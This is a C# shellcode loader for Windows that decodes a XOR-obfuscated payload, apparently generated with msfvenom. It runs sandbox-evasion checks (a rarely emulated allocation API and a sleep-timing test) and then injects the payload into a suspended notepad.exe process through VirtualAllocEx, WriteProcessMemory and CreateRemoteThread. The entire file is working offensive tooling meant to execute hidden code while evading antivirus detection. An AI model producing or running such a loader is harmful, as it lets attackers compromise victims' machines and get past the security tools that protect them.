using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

using System.Diagnostics;
using System.Runtime.InteropServices;
using System;
using System.Text;
using System.Threading;


public class Program
{

    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openthread
    [DllImport("kernel32.dll")]
    //static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
    static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-suspendthread
    [DllImport("kernel32.dll")]
    static extern uint SuspendThread(IntPtr hThread);

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-resumethread
    [DllImport("kernel32.dll")]
    static extern int ResumeThread(IntPtr hThread);

    //https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-zwunmapviewofsection
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    //https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect,
            UInt32 nndPreferred);

    [DllImport("kernel32.dll")]
    //public static extern IntPtr VirtualAllocEx(IntPtr lpHandle,IntPtr lpAddress, IntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
    private static UInt32 SUSPEND_RESUME = 0x0002;

    // ven -p windows/x64/XXX EXITFUNC=thread -f csharp -> xor with key
    static byte[] _shellcode = new byte[276] { 0x9e, 0x29, 0xe7, 0x81, 0x91, 0x8e, 0xa6, 0x65, 0x6e, 0x77, 0x20, 0x37, 0x27, 0x35, 0x3c, 0x33, 0x37, 0x2c, 0x54, 0xb3, 0x03, 0x2e, 0xee, 0x3c, 0x17, 0x29, 0xed, 0x34, 0x7d, 0x26, 0xe9, 0x33, 0x44, 0x2d, 0xea, 0x14, 0x36, 0x2d, 0x61, 0xc0, 0x2b, 0x2c, 0x2b, 0x54, 0xa7, 0x2a, 0x50, 0xa4, 0xc9, 0x5d, 0x07, 0x1a, 0x67, 0x42, 0x57, 0x20, 0xa7, 0xaf, 0x68, 0x2f, 0x63, 0xa0, 0x86, 0x88, 0x33, 0x27, 0x37, 0x2d, 0xe5, 0x25, 0x41, 0xed, 0x24, 0x59, 0x26, 0x63, 0xb1, 0xef, 0xe5, 0xe9, 0x66, 0x66, 0x65, 0x26, 0xf2, 0xa1, 0x12, 0x01, 0x2d, 0x6f, 0xb2, 0x31, 0xef, 0x2d, 0x79, 0x22, 0xed, 0x25, 0x4e, 0x3e, 0x60, 0xb6, 0x85, 0x33, 0x26, 0x9d, 0xa8, 0x25, 0xee, 0x55, 0xee, 0x2e, 0x64, 0xb8, 0x3a, 0x50, 0xaf, 0x2e, 0x54, 0xae, 0xce, 0x20, 0xa5, 0xac, 0x6c, 0x27, 0x67, 0xa4, 0x56, 0x97, 0x14, 0x97, 0x2a, 0x66, 0x22, 0x46, 0x69, 0x21, 0x5c, 0xb0, 0x13, 0xbe, 0x3d, 0x2a, 0xfc, 0x21, 0x42, 0x2f, 0x64, 0xbe, 0x04, 0x20, 0xef, 0x69, 0x29, 0x22, 0xed, 0x25, 0x72, 0x3e, 0x60, 0xb6, 0x27, 0xee, 0x6a, 0xea, 0x29, 0x65, 0xb5, 0x20, 0x3e, 0x27, 0x3d, 0x30, 0x2e, 0x3b, 0x27, 0x3e, 0x24, 0x37, 0x23, 0x3b, 0x2c, 0xe6, 0x8d, 0x46, 0x27, 0x37, 0x91, 0x97, 0x39, 0x27, 0x3f, 0x3f, 0x26, 0xe9, 0x73, 0x8d, 0x32, 0x9e, 0x99, 0x99, 0x38, 0x26, 0xcd, 0x60, 0x66, 0x66, 0x65, 0x6e, 0x62, 0x61, 0x64, 0x2d, 0xec, 0xeb, 0x67, 0x64, 0x6e, 0x77, 0x20, 0xdc, 0x57, 0xee, 0x01, 0xe5, 0x9e, 0xb1, 0xde, 0x91, 0xd3, 0xc4, 0x33, 0x2f, 0xcd, 0xc7, 0xf3, 0xdb, 0xf8, 0x91, 0xb7, 0x29, 0xe7, 0xa1, 0x49, 0x5a, 0x60, 0x19, 0x64, 0xf7, 0x9a, 0x86, 0x13, 0x60, 0xd5, 0x25, 0x72, 0x16, 0x0a, 0x0b, 0x66, 0x3f, 0x24, 0xe7, 0xad, 0x9e, 0xb3, 0x05, 0x04, 0x02, 0x01, 0x4f, 0x01, 0x1d, 0x04, 0x66 };
    public static byte[] XOReD(byte[] byteIn)
    {
        string keyIn = "badeaffenwaffen";

        for (int i = 0; i < byteIn.Length; i++)
        {
            byteIn[i] = (byte)(byteIn[i] ^ keyIn[i % keyIn.Length]);
        }
        return byteIn;
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    public static void Main()
    {

        Console.WriteLine("[+] Running sandbox evasion using the non-emulated API VirtualAllocExNuma");
        // Sandbox evasion using rare-emulated API to attempt heuristics/behaviour bypass
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null)
        {
            Console.WriteLine("(VirtualAllocExNuma) [-] Failed check");
            return;
        }

        Console.WriteLine("[+] Delay of three seconds for scan bypass check");
        // Sleep for 3 seconds to evade in-memory scan and checks if the emulator did not fast forward through the sleep instruction
        DateTime time1 = DateTime.Now;
        Thread.Sleep(3000);
        double time2 = DateTime.Now.Subtract(time1).TotalSeconds;
        if (time2 < 2.5)
        {
            Console.WriteLine("(Sleep) [-] Failed check");
            return;
        }

        byte[] shellcode = XOReD(_shellcode);

        string proc = "notepad.exe";

        Process newproc;

        var info = new ProcessStartInfo(proc, "")
        {
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        info.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

        System.Diagnostics.Process process = new System.Diagnostics.Process();
        process.StartInfo = info;
        process.Start();

        newproc = Process.Start(proc);
        Console.WriteLine("Started " + proc + " with Process Id:" + newproc.Id);
        Console.WriteLine("Suspending process...");
        foreach (ProcessThread thread in newproc.Threads)
        {
            IntPtr pOpenThread;
            pOpenThread = OpenThread(SUSPEND_RESUME, false, (uint)thread.Id);
            if (pOpenThread == IntPtr.Zero)
            {
                break;
            }
            SuspendThread(pOpenThread);
        }
        Console.WriteLine("Suspended!");

        IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, newproc.Id);

        IntPtr spaceAddr = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Console.WriteLine("Allocating memory");
        WriteProcessMemory(procHandle, spaceAddr, shellcode, new IntPtr(shellcode.Length), 0);
        Console.WriteLine("Copied shellcode in memory");
        IntPtr pinfo = IntPtr.Zero;
        IntPtr threatH = CreateRemoteThread(procHandle, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
        Console.WriteLine("Created remote thread");
        Console.WriteLine("Resuming process...");

        foreach (ProcessThread thread in newproc.Threads)
        {
            IntPtr pOpenThread;
            pOpenThread = OpenThread(SUSPEND_RESUME, false, (uint)thread.Id);
            if (pOpenThread == IntPtr.Zero)
            {
                break;
            }
            ResumeThread(pOpenThread);
        }
        Console.WriteLine("Resumed!");


    }

}
